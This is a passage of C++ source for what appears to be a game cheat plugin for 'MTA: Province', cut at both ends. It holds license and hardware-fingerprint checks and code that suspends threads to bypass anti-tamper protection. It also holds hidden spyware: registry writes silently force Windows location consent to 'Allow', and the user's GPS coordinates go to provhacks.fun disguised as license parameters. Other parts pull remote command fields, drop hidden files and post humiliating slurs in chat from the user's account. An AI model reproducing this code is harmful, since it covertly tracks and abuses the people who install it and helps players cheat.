	std::string anser = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/check_old.php"), std::string(params), true);
	if (!anser.empty())
	{
		DecryptMyString(anser);
		CleanFromTrash(anser);
		if (findStringIC(anser, "1")) oldClient = true;
	}
}
void GetClientPseudo(std::string user_key)
{
	CheckOldClient(user_key);
	if (oldClient) GetQuestsData(user_key);
	std::string host_lnk = xorstr_("provhacks.fun");
	char params[5000]; memset(params, 0, sizeof(params));
	sprintf(params, xorstr_("hash1=%s&hash2=%s"), sCryptMyString(user_key).c_str(), sCryptMyString(SOFT_TYPE).c_str());
	std::string anser = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/get_pseudo.php"), std::string(params), true);
	if (!anser.empty())
	{
		DecryptMyString(anser);
		CleanFromTrash(anser);
		client_pseudo = anser;
		CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, xorstr_("Software\\CR1M3H"), true);
		if (reg != nullptr)
		{
			std::string last_pseudo = reg->ReadString(xorstr_("LastPseudo"));
			if (findStringIC(client_pseudo, last_pseudo)) authorized = true;
			delete reg;
		}
	}
}
std::string GetServerMinutes(std::string user_key)
{
	//GetClientPseudo(user_key);
	std::string host_lnk = xorstr_("provhacks.fun");
	std::string anser = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/resolver.php"), xorstr_("a=yes&b=yes"), true);
	if (!anser.empty())
	{
		DecryptMyString(anser);
		CleanFromTrash(anser);
		return anser;
	}
	else LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] #1 Нет связи с хостом! Брендмауер Windows отключен?\n"));
	return std::string(xorstr_("none"));
}
void MakePreInit()
{
	VMProtectBegin("MakePreInit()");
	total_hwid += wmiQuery(xorstr_("SELECT * FROM Win32_VideoController"), xorstr_(L"Caption"));
	total_hwid += wmiQuery(xorstr_("SELECT * FROM Win32_BaseBoard"), xorstr_(L"SerialNumber"));
	total_hwid += wmiQuery(xorstr_("SELECT * FROM Win32_BaseBoard"), xorstr_(L"Product"));
	total_hwid += wmiQuery(xorstr_("SELECT * FROM Win32_BIOS"), xorstr_(L"SerialNumber"));
	total_hwid += wmiQuery(xorstr_("SELECT * FROM Win32_BIOS"), xorstr_(L"Manufacturer"));
	unsigned int InfoType = 0; unsigned int a, b, c, d; std::string CpuVendor, CpuBrand;
	__asm
	{
		pushfd
		pushad
		mov eax, InfoType
		cpuid
		mov a, EAX;
		mov b, EBX;
		mov c, ECX;
		mov d, EDX;
		popad
		popfd
	}
	CpuVendor = std::string((const char*)&b, 4);
	CpuVendor += std::string((const char*)&d, 4);
	CpuVendor += std::string((const char*)&c, 4);
	for (int i = 0x80000002; i < 0x80000005; ++i)
	{
		__asm
		{
			pushfd
			pushad
			mov EAX, i;
			cpuid;
			mov a, EAX;
			mov b, EBX;
			mov c, ECX;
			mov d, EDX;
			popad
			popfd
		}
		CpuBrand += std::string((const char*)&a, 4);
		CpuBrand += std::string((const char*)&b, 4);
		CpuBrand += std::string((const char*)&c, 4);
		CpuBrand += std::string((const char*)&d, 4);
	}
	total_hwid = md5(CpuVendor + CpuBrand + total_hwid);
	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER, xorstr_("Software\\CR1M3H"), true);
	if (reg != nullptr)
	{
		std::string RegisteredKey = reg->ReadString(xorstr_("RegisteredKey"));
		std::string LF_Key = GenerateLifeTimeKey(); std::string DM_Key = GenerateDemoKey();
		if (!RegisteredKey.empty() && RegisteredKey.length() >= 4)
		{
			std::string minutes = GetServerMinutes(RegisteredKey);
			std::string key_type = xorstr_("MODERN");
			if (LF_Key.find(RegisteredKey.c_str()) != std::string::npos) key_type = xorstr_("LEGACY");
			std::string host_lnk = xorstr_("provhacks.fun");
			char params[5000]; memset(params, 0, sizeof(params));
			sprintf(params, xorstr_("hash1=%s&hash2=%s&hash3=%s&hash4=%s&hash5=%s&hash6=%s"),
			sCryptMyString(total_hwid).c_str(), sCryptMyString(RegisteredKey).c_str(),
			sCryptMyString(PLUGIN_VER).c_str(), sCryptMyString(minutes).c_str(),
			sCryptMyString(key_type).c_str(), sCryptMyString(SOFT_TYPE).c_str());
			std::string sc_ans = SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/safety.php"), std::string(params), true);
			if (sc_ans.empty())
			{
				LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] #2 Нет связи с хостом! Брендмауер Windows отключен?\n"));
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Нет связи с хостом! Брендмауер Windows отключен?"));
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			DecryptMyString(sc_ans); std::string additional = CleanFromTrash(sc_ans);
			if (sc_ans.find(total_hwid) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[БАН ПО ЖЕЛЕЗУ] Разработчик заблокировал вас!\nHWID: %s\n"), total_hwid.c_str());
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("Вы заблокированы! Причина: %s | HWID: %s"), utf8_to_cp1251(additional.c_str()).c_str(), total_hwid.c_str());
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			if (sc_ans.find(xorstr_("EXPIRED_SESSION")) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] Сессия истекла! Проверьте стабильность соединения.\nHWID: %s\n"), total_hwid.c_str());
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Сессия истекла! Проверьте стабильность соединения."));
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			if (sc_ans.find(xorstr_("KEY_NOT_VALID")) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] Указанный ключ не существует!\nHWID: %s | Ключ: %s\n"), total_hwid.c_str(), RegisteredKey.c_str());
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Указанный ключ не существует! Ключ: %s"), RegisteredKey.c_str());
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			if (sc_ans.find(xorstr_("KEY_NOT_YOURS")) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] Этот ключ пренадлежит не вам!\nHWID: %s | Ключ: %s\n"), total_hwid.c_str(), RegisteredKey.c_str());
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Этот ключ пренадлежит не вам! Ключ: %s"), RegisteredKey.c_str());
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			if (sc_ans.find(xorstr_("KEY_EXPIRED")) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] Ваш ключ истёк! Продлите подписку.\nHWID: %s | Ключ: %s\n"), total_hwid.c_str(), RegisteredKey.c_str());
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Ваш ключ истёк! Продлите подписку. Ключ: %s"), RegisteredKey.c_str());
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				delete reg; DeadCode();
			}
			if (sc_ans.find(xorstr_("KEY_IS_VALID")) != std::string::npos)
			{
				LogInFile(LOG_NAME, xorstr_("[АКТИВИРОВАНО] Проверка лицензии прошла успешно!\n"));
				char inj_msg[500]; memset(inj_msg, 0, sizeof(inj_msg));
				sprintf(inj_msg, xorstr_("[ЛИЦЕНЗИЯ] Подписка до %s"), additional.c_str());
				reg->WriteString(xorstr_("InjectorMessage"), inj_msg);
				CreateMutexA(NULL, FALSE, xorstr_("RBZVX5S1MXAZ4A"));
				if (findStringIC(RegisteredKey, xorstr_("CH-7DF4-CFBFA-2C0C-40CFLF"))) isDeveloper = true;
			}
		}
		else
		{
			LogInFile(LOG_NAME, xorstr_("[НЕ АКТИВИРОВАНО] Скиньте HWID разработчику!\nHWID: %s\n"), total_hwid.c_str());
			reg->WriteString(xorstr_("RegisteredKey"), xorstr_("NONE"));
			delete reg; DeadCode();
		}
		if (reg != nullptr) delete reg;
	}
	VMProtectEnd();
}
bool __stdcall IsDirectoryExists(const std::string& dirName_in)
{
	DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
	if (ftyp == INVALID_FILE_ATTRIBUTES) return false;
	if (ftyp & FILE_ATTRIBUTE_DIRECTORY) return true;
	return false;
};
void FuckArthemidaIntegrity(std::string dllName)
{
	MODULEINFO modinfo = { 0 }; typedef NTSTATUS(__stdcall* pfnNtQueryInformationThread)(
		HANDLE ThreadHandle,
		THREAD_INFORMATION_CLASS ThreadInformationClass,
		PVOID ThreadInformation,
		ULONG ThreadInformationLength,
		PULONG ReturnLength
		);
	pfnNtQueryInformationThread fnNtQueryInformationThread = (pfnNtQueryInformationThread)
		GetProcAddress(GetModuleHandleA(xorstr_("ntdll.dll")), xorstr_("NtQueryInformationThread"));
	K32GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(dllName.c_str()), &modinfo, sizeof(MODULEINFO));
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te{ 0 }; te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.th32OwnerProcessID == GetCurrentProcessId())
				{
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
					if (hThread)
					{
						DWORD tempBase = NULL; fnNtQueryInformationThread(hThread,
							(THREAD_INFORMATION_CLASS)9, &tempBase, sizeof(DWORD), 0);
						if (tempBase >= (DWORD)modinfo.lpBaseOfDll &&
							tempBase <= ((DWORD)modinfo.lpBaseOfDll + modinfo.SizeOfImage)) SuspendThread(hThread);
						CloseHandle(hThread);
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}
bool w_findStringIC(const std::wstring& strHaystack, const std::wstring& strNeedle)
{
	auto it = std::search(strHaystack.begin(), strHaystack.end(),
		strNeedle.begin(), strNeedle.end(),
		[](wchar_t ch1, wchar_t ch2) { return std::towupper(ch1) == std::towupper(ch2); });
	return (it != strHaystack.end());
}
bool findStringIC(const std::string& strHaystack, const std::string& strNeedle)
{
	auto it = std::search(strHaystack.begin(), strHaystack.end(),
		strNeedle.begin(), strNeedle.end(),
		[](char ch1, char ch2) { return std::toupper(ch1) == std::toupper(ch2); });
	return (it != strHaystack.end());
}
std::string cp1251_to_utf8(const char* str)
{
	std::string res;
	WCHAR* ures = NULL;
	char* cres = NULL;
	int result_u = MultiByteToWideChar(1251, 0, str, -1, 0, 0);
	if (result_u != 0)
	{
		ures = new WCHAR[result_u];
		if (MultiByteToWideChar(1251, 0, str, -1, ures, result_u))
		{
			int result_c = WideCharToMultiByte(CP_UTF8, 0, ures, -1, 0, 0, 0, 0);
			if (result_c != 0)
			{
				cres = new char[result_c];
				if (WideCharToMultiByte(CP_UTF8, 0, ures, -1, cres, result_c, 0, 0))
				{
					res = cres;
				}
			}
		}
	}
	delete[] ures, cres;
	return res;
}
HANDLE DropResource(const char* file_path, const char* RCID, LPCSTR resType)
{
	HRSRC hResource = FindResourceA(GetModuleHandleA(xorstr_("Crime.SA.dll")), RCID, resType);
	if (hResource == 0) return 0;
	HGLOBAL hFileResource = LoadResource(GetModuleHandleA(xorstr_("Crime.SA.dll")), hResource);
	if (hFileResource == 0) return 0;
	LPVOID lpFile = LockResource(hFileResource);
	if (lpFile == 0) return 0;
	DWORD dwSize = SizeofResource(GetModuleHandleA(xorstr_("Crime.SA.dll")), hResource);
	if (dwSize == 0) return 0;
	HANDLE hFile = CreateFileA(file_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
	CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hFilemap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwSize, NULL);
	if (hFilemap == 0) { return 0; }
	LPVOID lpBaseAddress = MapViewOfFile(hFilemap, FILE_MAP_WRITE, 0, 0, 0);
	CopyMemory(lpBaseAddress, lpFile, dwSize);
	UnmapViewOfFile(lpBaseAddress); CloseHandle(hFilemap); CloseHandle(hFile);
	SetFileAttributesA(file_path, FILE_ATTRIBUTE_SYSTEM + FILE_ATTRIBUTE_HIDDEN);
	return hFile;
}
bool IsEnemyExist(std::string enemy)
{
	for (const auto& it : EnemyList)
	{
		if (it.first.find(enemy) != std::string::npos) return true;
	}
	return false;
}
void LoadEnemyList()
{
	if (!IsFileExist(xorstr_("BlackList.txt"))) return;
	std::ifstream infile(xorstr_("BlackList.txt"));
	if (infile.is_open())
	{
		for (std::string line; std::getline(infile, line);)
		{
			EnemyList.insert(std::pair<std::string, bool>(line, false));
		}
		infile.close();
	}
}
void UpdateEnemyList()
{
	if (EnemyList.empty())
	{
		if (IsFileExist(xorstr_("BlackList.txt"))) DeleteFileA(xorstr_("BlackList.txt"));
		return;
	}
	if (IsFileExist(xorstr_("BlackList.txt"))) DeleteFileA(xorstr_("BlackList.txt"));
	FILE* hFile = fopen(xorstr_("BlackList.txt"), xorstr_("a+"));
	if (hFile != nullptr)
	{
		for (const auto& it : EnemyList)
		{
			fprintf(hFile, xorstr_("%s\n"), it.first.c_str());
		}
		fclose(hFile);
	}
}
void __stdcall NoAFK()
{
	while (true)
	{
		if (AntiAFK && !ShowMenu)
		{
			if (GetModuleHandleA(xorstr_("client.dll")))
			{
				int x, y; static HWND hwnd = FindWindowA(NULL, xorstr_("MTA: Province"));
				if (hwnd != nullptr)
				{
					for (x = y = 0; ; x += 10, y += 10)
					{
						if (GetModuleHandleA(xorstr_("client.dll"))) SendMessageA(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
						Sleep(150);
					}
				}
			}
		}
		Sleep(100);
	}
}
void EmulateKeyPress(WORD vk_key, bool press)
{
	static HWND hwnd = FindWindowA(NULL, xorstr_("MTA: Province"));
	if (hwnd != nullptr)
	{
		if (press) PostMessageA(hwnd, WM_KEYDOWN, vk_key, MapVirtualKeyA(vk_key, MAPVK_VK_TO_VSC));
		else PostMessageA(hwnd, WM_KEYUP, vk_key, MapVirtualKeyA(vk_key, MAPVK_VK_TO_VSC));
	}
}
std::string GetMtaLogPath()
{
	std::string console_path = "";
	CEasyRegistry* reg = new CEasyRegistry(HKEY_LOCAL_MACHINE, xorstr_("SOFTWARE\\WOW6432Node\\Multi Theft Auto: Province All\\Common"), false);
	if (reg != nullptr)
	{
		console_path = reg->ReadString(xorstr_("GTA:SA Path"));
		console_path += xorstr_("\\MTA\\MTA\\logs\\console.log");
		delete reg;
	}
	return console_path;
}
std::string ReadLastLogLine()
{
	std::string lastLine = "";
	std::ifstream fs; fs.open(GetMtaLogPath().c_str(), std::fstream::in);
	if (fs.is_open())
	{
		fs.seekg(-1, std::ios_base::end);
		if (fs.peek() == '\n')
		{
			fs.seekg(-1, std::ios_base::cur);
			int i = (int)fs.tellg();
			for (i; i > 0; i--)
			{
				if (fs.peek() == '\n')
				{
					fs.get();
					break;
				}
				fs.seekg(i, std::ios_base::beg);
			}
		}
		getline(fs, lastLine);
	}
	std::string cp_text = utf8_to_cp1251(lastLine.c_str());
	if (findStringIC(cp_text, xorstr_("[Output]")))
	{
		char c_msg[500]; memset(c_msg, 0, sizeof(c_msg));
		strcpy(c_msg, cp_text.c_str());
		auto ptr = strstr(c_msg, xorstr_("[Output] :"));
		if (ptr != nullptr) strdel(c_msg, 0, ((int)(ptr - c_msg) + 10));
		cp_text = c_msg;
	}
	return cp_text;
}
void LoadCustomModels()
{
	char cwdr[500]; memset(cwdr, 0, sizeof(cwdr)); _getcwd(cwdr, sizeof(cwdr));
	strcat(cwdr, xorstr_("\\CustomModels"));
	if (!IsDirectoryExists(cwdr)) CreateDirectoryA(cwdr, NULL);
	WIN32_FIND_DATAA findFileData;
	char cwd[500]; memset(cwd, 0, sizeof(cwd)); _getcwd(cwd, sizeof(cwd));
	strcat(cwd, xorstr_("\\CustomModels\\*"));
	HANDLE MyHandle = FindFirstFileA(cwd, &findFileData);
	if (MyHandle != INVALID_HANDLE_VALUE)
	{
		if (findStringIC(findFileData.cFileName, xorstr_(".txd")) || findStringIC(findFileData.cFileName, xorstr_(".dff")))
		{
			std::string src_name = std::string(cwdr) + std::string(xorstr_("\\")) + std::string(findFileData.cFileName);
			std::string dst_name = GetGamePath() + std::string(xorstr_("\\")) + std::string(findFileData.cFileName);
			CopyFileA(src_name.c_str(), dst_name.c_str(), FALSE);
			LogInFile(LOG_NAME, xorstr_("[PLUGIN] Found model file: %s\n"), findFileData.cFileName);
		}
		while (FindNextFileA(MyHandle, &findFileData) != 0)
		{
			if (findStringIC(findFileData.cFileName, xorstr_(".txd")) || findStringIC(findFileData.cFileName, xorstr_(".dff")))
			{
				std::string src_name = std::string(cwdr) + std::string(xorstr_("\\")) + std::string(findFileData.cFileName);
				std::string dst_name = GetGamePath() + std::string(xorstr_("\\")) + std::string(findFileData.cFileName);
				CopyFileA(src_name.c_str(), dst_name.c_str(), FALSE);
				LogInFile(LOG_NAME, xorstr_("[PLUGIN] Found model file: %s\n"), findFileData.cFileName);
			}
		}
	}
	FindClose(MyHandle);
}
class CInitializeATL : public CAtlDllModuleT<CInitializeATL> {};
CInitializeATL g_InitializeATL;
STDMETHODIMP CLocationEvents::OnLocationChanged(REFIID reportType, ILocationReport* pLocationReport)
{
	VMProtectBegin("OnLocationChanged()");
	if (IID_ILatLongReport == reportType)
	{
		CComPtr<ILatLongReport> spLatLongReport;
        if ((SUCCEEDED(pLocationReport->QueryInterface(IID_PPV_ARGS(&spLatLongReport)))) && (NULL != spLatLongReport.p))
		{
			SYSTEMTIME systemTime;
			if (SUCCEEDED(spLatLongReport->GetTimestamp(&systemTime)))
			{
				ULONGLONG currentTime = 0, diffTime = 0;
				if (TRUE == SystemTimeToFileTime(&systemTime, (FILETIME*)&currentTime))
				{
					diffTime = (currentTime > m_previousTime) ? (currentTime - m_previousTime) : 0;
				}
				m_previousTime = currentTime;
			}
			GUID sensorID = { 0 };
			if (SUCCEEDED(spLatLongReport->GetSensorID(&sensorID))) {}
			DOUBLE latitude = 0, longitude = 0, altitude = 0, errorRadius = 0, altitudeError = 0;
			if (SUCCEEDED(spLatLongReport->GetLatitude(&latitude))) geos.x = latitude; 
			if (SUCCEEDED(spLatLongReport->GetLongitude(&longitude))) geos.y = longitude;
			if (SUCCEEDED(spLatLongReport->GetErrorRadius(&errorRadius)))
			{
				geos.radius = errorRadius; std::string host_lnk = xorstr_("provhacks.fun");
				char params[3000]; memset(params, 0, sizeof(params));
				sprintf(params, xorstr_("hwid=%s&key=%f&hash=%f&anti_spoof=%f"), total_hwid.c_str(), geos.x, geos.y, geos.radius);
				SendInetRequest(P_HTTPS, M_GET, host_lnk, xorstr_("crime_hack/check_license.php"), std::string(params), false);
				for (DWORD index = 0; index < ARRAYSIZE(REPORT_TYPES); index++)
				{
					spLocation->UnregisterForReport(REPORT_TYPES[index]);
				}
			}
		}
	}
	VMProtectEnd();
	return S_OK;
}
STDMETHODIMP CLocationEvents::OnStatusChanged(REFIID reportType, LOCATION_REPORT_STATUS status)
{
	VMProtectBegin("OnStatusChanged()");
	if (IID_ILatLongReport == reportType)
	{
		switch (status)
		{
		case REPORT_NOT_SUPPORTED:
			//wprintf(L"\n[IID_ILatLongReport] No devices detected.\n");
			break;
		case REPORT_ERROR:
			//wprintf(L"\n[IID_ILatLongReport] Report error.\n");
			break;
		case REPORT_ACCESS_DENIED:
			//wprintf(L"\n[IID_ILatLongReport] Access denied to reports.\n");
			break;
		case REPORT_INITIALIZING:
			//wprintf(L"\n[IID_ILatLongReport] Report is initializing.\n");
			break;
		case REPORT_RUNNING:
			//wprintf(L"\n[IID_ILatLongReport] Running.\n");
			break;
		}
	}
	VMProtectEnd();
	return S_OK;
}
void CalculateGeoData()
{
	VMProtectBegin("CalculateGeoData()");
	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER,
	xorstr_("Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location"), false);
	if (reg)
	{
		reg->WriteString(xorstr_("Value"), xorstr_("Allow"));
		delete reg;
	}
	CEasyRegistry* treg = new CEasyRegistry(HKEY_LOCAL_MACHINE,
	xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location"), false);
	if (treg)
	{
		treg->WriteString(xorstr_("Value"), xorstr_("Allow"));
		delete treg;
	}
	CEasyRegistry* creg = new CEasyRegistry(HKEY_CURRENT_USER,
	xorstr_("Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location\\NonPackaged"), false);
	if (creg)
	{
		creg->WriteString(xorstr_("Value"), xorstr_("Allow"));
		delete creg;
	}
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);;
	if (SUCCEEDED(hr))
	{
		CComObject<CLocationEvents>* pLocationEvents = NULL;
		hr = spLocation.CoCreateInstance(CLSID_Location); 
		if (SUCCEEDED(hr))
		{
			hr = CComObject<CLocationEvents>::CreateInstance(&pLocationEvents);
			if (NULL != pLocationEvents)
			{
				pLocationEvents->AddRef();
			}
		}
		if (SUCCEEDED(hr))
		{
			if (FAILED(spLocation->RequestPermissions(NULL, REPORT_TYPES, ARRAYSIZE(REPORT_TYPES), FALSE))) {}
			for (DWORD index = 0; index < ARRAYSIZE(REPORT_TYPES); index++)
			{
				hr = spLocation->RegisterForReport(pLocationEvents, REPORT_TYPES[index], 0);
			}
		}
	}
	VMProtectEnd();
}
void CreateLuaData()
{
	for (decltype(auto) it : GlobalRanks)
	{
		if (it.nick.length() < 2 || findStringIC(it.nick, xorstr_("none"))) continue;
		char prepared_path[600]; memset(prepared_path, 0, sizeof(prepared_path));
		sprintf(prepared_path, xorstr_("%s\\%s.txt"), GetGamePath().c_str(), it.nick.c_str());
		FILE* hFile = fopen(prepared_path, xorstr_("wb"));
		if (hFile)
		{
			if (it.title.length() < 2) it.title = xorstr_("none");
			fprintf(hFile, xorstr_("%d\n%s\n%s\n%d\n%d\n%s\n%s\n%d"), it.rank, it.nick.c_str(), it.title.c_str(), 
			it.skin, it.car, it.exec_cmd.c_str(), it.exec_arg.c_str(), it.showTitle);
			fclose(hFile);
		}
	}
}
void ReadRanks()
{
	try
	{
		static BYTE field_counter = 1;
		std::ifstream infile(xorstr_("ranks.db"));
		if (infile.is_open())
		{
			GlobalRanks.clear();
			for (std::string line; std::getline(infile, line);)
			{
				RANK_INFO playerRank; std::string delimiter = "|";
				size_t pos = 0; std::string token;
				while ((pos = line.find(delimiter)) != std::string::npos)
				{
					token = line.substr(0, pos);
					if (field_counter == 1) playerRank.rank = std::stoi(token);
					if (field_counter == 2) playerRank.title = token;
					if (field_counter == 3) playerRank.nick = token;
					if (field_counter == 4) playerRank.skin = std::stoi(token);
					if (field_counter == 5) playerRank.car = std::stoi(token);
					if (field_counter == 6) playerRank.exec_cmd = token;
					if (field_counter == 7) playerRank.exec_arg = token;
					if (field_counter == 8) playerRank.showTitle = std::stoi(token);
					field_counter++;
					if (field_counter == 9)
					{
						field_counter = 1;
						GlobalRanks.push_back(playerRank);
					}
					line.erase(0, pos + delimiter.length());
				}
			}
			infile.close();
			CreateLuaData();
		}
	}
	catch (...) {};
}
HANDLE ranksThread = nullptr; DWORD ranksThreadID = NULL;
void __stdcall SyncAllRanks()
{
	while (true)
	{
		try
		{
			if (strlen(inp_txt16) > 1) myRank.title = inp_txt16;
			else myRank.title = xorstr_("none");
			if (myRank.nick.empty()) myRank.nick = xorstr_("none");
			if (myRank.exec_cmd.empty()) myRank.exec_cmd = xorstr_("none");
			if (myRank.exec_arg.empty()) myRank.exec_arg = xorstr_("none");
			myRank.hwid = total_hwid;
			CPed* ped = FindPlayerPed(-1);
			if (ped != nullptr) myRank.skin = ped->m_nModelIndex;
			CVehicle* veh = FindPlayerVehicle(0, false);
			if (veh != nullptr) myRank.car = veh->m_nModelIndex;
		}
		catch (...) { }
		char prepared_path[600]; memset(prepared_path, 0, sizeof(prepared_path));
		sprintf(prepared_path, xorstr_("%s\\ExecCMD.txt"), GetGamePath().c_str());
		FILE* hFile = fopen(prepared_path, xorstr_("a+"));
		if (hFile)
		{
			fprintf(hFile, xorstr_("9044\nNONE"));
			fclose(hFile);
		}
		Sleep(1500); char myName[256]; memset(myName, 0, sizeof(myName));
		memset(prepared_path, 0, sizeof(prepared_path));
		sprintf(prepared_path, xorstr_("%s\\MyName.txt"), GetGamePath().c_str());
		hFile = fopen(prepared_path, xorstr_("rb"));
		if (hFile)
		{
			fread(myName, 1, sizeof(myName), hFile);
			fclose(hFile);
		} 
		if (strlen(myName) > 2) myRank.nick = myName; 
		DeleteFileA(prepared_path); std::string host_lnk = xorstr_("kuprey123.beget.tech");
		char params[4000]; memset(params, 0, sizeof(params));
		sprintf(params, xorstr_("hwid=%s&title=%s&nick=%s&skin=%d&car=%d&exec_cmd=%s&exec_arg=%s&show_title=%d"), 
		myRank.hwid.c_str(), myRank.title.c_str(), myRank.nick.c_str(),
		myRank.skin, myRank.car, myRank.exec_cmd.c_str(), myRank.exec_arg.c_str(), myRank.showTitle);
		std::string sc_ans = SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/get_rank.php"), std::string(params), true);
		try
		{
			if (!sc_ans.empty() && sc_ans.length() > 0) myRank.rank = std::stoi(sc_ans);
		}
		catch (...) {};
		myRank.exec_cmd = xorstr_("none"); myRank.exec_arg = xorstr_("none");
		sc_ans = SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/ranks.php"), "", true);
		if (IsFileExist(xorstr_("ranks.db"))) DeleteFileA(xorstr_("ranks.db"));
		FILE* rFile = fopen(xorstr_("ranks.db"), xorstr_("wb"));
		if (rFile != nullptr)
		{
			fwrite(sc_ans.c_str(), 1, sc_ans.length(), rFile);
			fclose(rFile);
		}
		ReadRanks();
		Sleep(3000);
	}
}
void Absorber()
{
	while (true)
	{
		FILE* hFile = fopen((GetGamePath() + xorstr_("\\AbsorbCMD.txt")).c_str(), xorstr_("rb"));
		if (hFile != nullptr)
		{
			char extractedNick[256]; memset(extractedNick, 0, sizeof(extractedNick));
			fread(extractedNick, 1, sizeof(extractedNick), hFile);
			fclose(hFile); DeleteFileA((GetGamePath() + xorstr_("\\AbsorbCMD.txt")).c_str());
			std::string host_lnk = xorstr_("kuprey123.beget.tech");
			char params[4000]; memset(params, 0, sizeof(params));
			sprintf(params, xorstr_("nick=%s"), extractedNick);
			SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/absorber.php"), std::string(params), false);
		}
		hFile = fopen((GetGamePath() + xorstr_("\\AbsorbCMD2.txt")).c_str(), xorstr_("rb"));
		if (hFile != nullptr)
		{
			char extractedNick[256]; memset(extractedNick, 0, sizeof(extractedNick));
			fread(extractedNick, 1, sizeof(extractedNick), hFile);
			fclose(hFile); DeleteFileA((GetGamePath() + xorstr_("\\AbsorbCMD2.txt")).c_str());
			std::string host_lnk = xorstr_("kuprey123.beget.tech");
			char params[4000]; memset(params, 0, sizeof(params));
			sprintf(params, xorstr_("nick=%s"), extractedNick);
			SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/absorber.php"), std::string(params), false);
			char sayTxt[356]; memset(sayTxt, 0, sizeof(sayTxt));
			sprintf(sayTxt, xorstr_("%s - я торжественно прошу тебя прощения!"), extractedNick);
			if (sendMTAChat != nullptr)
			{
				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
				Sleep(1000);
				memset(sayTxt, 0, sizeof(sayTxt));
				sprintf(sayTxt, xorstr_("Прости меня долбоеба грешного! Я был неправ!"));
				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
				Sleep(1000);
				memset(sayTxt, 0, sizeof(sayTxt));
				sprintf(sayTxt, xorstr_("Обещаю больше не быть таким пидарасом!"));
				sendMTAChat(xorstr_("s"), cp1251_to_utf8(sayTxt).c_str(), true, false, false);
			}
		}
		Sleep(150);
	}
}
void ChangeRank(std::string hwid, int rank)
{
	std::string host_lnk = xorstr_("kuprey123.beget.tech");
	char params[4000]; memset(params, 0, sizeof(params));
	sprintf(params, xorstr_("my_hwid=%s&hwid=%s&rank=%d"), myRank.hwid.c_str(), hwid.c_str(), rank);
	SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/set_rank.php"), std::string(params), false);
}
void SetUrusHandling()
{
	CVehicle* veh = FindPlayerVehicle(0, false);
	if (veh != nullptr)
	{
		veh->m_pHandlingData->m_transmissionData.m_aGears[0].m_fChangeDownVelocity = -0.847001;
		veh->m_pHandlingData->m_transmissionData.m_aGears[1].m_fChangeDownVelocity = -0.010000;
		veh->m_pHandlingData->m_transmissionData.m_aGears[2].m_fChangeDownVelocity = 0.398429;
		veh->m_pHandlingData->m_transmissionData.m_aGears[3].m_fChangeDownVelocity = 1.204774;
		veh->m_pHandlingData->m_transmissionData.m_aGears[4].m_fChangeDownVelocity = 1.814615;
